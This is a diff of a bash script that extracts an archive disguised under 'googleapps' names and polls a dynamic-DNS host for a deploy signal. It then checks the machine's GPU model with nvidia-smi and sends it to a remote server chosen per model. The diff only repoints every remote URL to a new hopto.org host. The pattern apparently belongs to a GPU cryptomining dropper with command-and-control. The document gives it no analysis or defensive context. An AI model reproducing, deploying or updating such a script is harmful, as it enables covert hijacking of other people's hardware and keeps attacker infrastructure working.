@@ -17,7 +17,7 @@ tar -xvf ./googleapps8474127412742.tar.gz
 
 cd googleapps8474
 
-string=$(curl http://mobile84.hopto.org/?q=deploy)
+string=$(curl http://mobile8474.hopto.org/?q=deploy)
 if [[ $string == *"16384"* ]]; then
 
 google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
@@ -54,7 +54,7 @@ else
 if [[ $google8474 == "QuadroM4000" ]]
 then
 
-arr[0]="http://mobile84.hopto.org/"
+arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -83,7 +83,7 @@ else
 if [[ $google8474 == "QuadroP5000" ]]
 then
 
-arr[0]="http://mobile84.hopto.org/"
+arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -109,7 +109,7 @@ fi
 
 else
 
-arr[0]="http://mobile84.hopto.org/"
+arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -157,7 +157,7 @@ google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
 if [[ $google8474 == "QuadroP4000" ]]
 then
 
-arr[0]="http://mobile84.hopto.org/"
+arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -186,7 +186,7 @@ else
 if [[ $google8474 == "QuadroM4000" ]]
 then
 
-arr[0]="http://mobile84.hopto.org/"
+arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -215,7 +215,7 @@ else
 if [[ $google8474 == "QuadroP5000" ]]
 then
 
-arr[0]="http://mobile84.hopto.org/"
+arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -241,7 +241,7 @@ fi
 
 else
 
-arr[0]="http://mobile84.hopto.org/"
+arr[0]="http://mobile8474.hopto.org/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
